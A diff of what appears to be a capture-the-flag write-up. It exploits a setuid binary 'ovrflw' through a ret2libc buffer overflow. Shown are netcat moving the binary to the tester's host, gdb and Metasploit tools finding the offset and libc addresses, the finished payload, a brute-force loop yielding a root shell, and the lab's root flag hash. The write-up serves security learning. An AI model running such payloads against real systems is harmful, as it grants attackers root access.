@@ -80,5 +80,48 @@ So I send this over to my local machine using netcat for further analysis.
 Sender :  └─# nc -w 3 10.10.14.13 1234 < ovrflw
 Receiver : └─# nc -lv -p 1234 > ovrflw
 └─# chmod +x ovrflw
+We want to find the offest, the system address, the exit address and the /bin/sh addresses.
+└─# gdb ./ovrflw
+gdb-peda$ b main
+gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Generated from query below
+└─# /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 200
+Next we need to find the exact offset:
+gdb-peda$ c
+Continuing.
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x64413764 in ?? ()
+└─# /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -q 64413764
+[*] Exact match at offset 112
+
+Now we need to find the other addresses:
+(gdb) p system
+p system
+$1 = {<text variable, no debug info>} 0xb7659310 <__libc_system>
+(gdb) p exit
+p exit
+$2 = {<text variable, no debug info>} 0xb764c260 <__GI_exit>
+Now it's time to find location for /bin/sh. The syntax as find 0xb7659310, +9999999, "/bin/sh"
+(gdb) find 0xb7659310, +9999999, "/bin/sh"
+find 0xb7659310, +9999999, "/bin/sh"
+0xb777bbac
+warning: Unable to access 16000 bytes of target memory at 0xb77c5f34, halting search.
+1 pattern found.
+
+Now it is time to organize the payload in little endian format:
+payload = "A"*112 + "\x10\x93\x65\xb7\x60\xc2\x64\xb7\xac\xbb\x77\xb7"
 
 
+while true; do ./ovrflw $(python -c 'print("A"*112 + "\x10\x93\x65\xb7\x60\xc2\x64\xb7\xac\xbb\x77\xb7")'); done
+This will bruteforce for a few seconds and eventually:
+# id
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
+# whoami
+whoami
+root
+# cat /root/root.txt
+cat /root/root.txt
+6bcb9cff749c9318d2a6e71bbcf30318
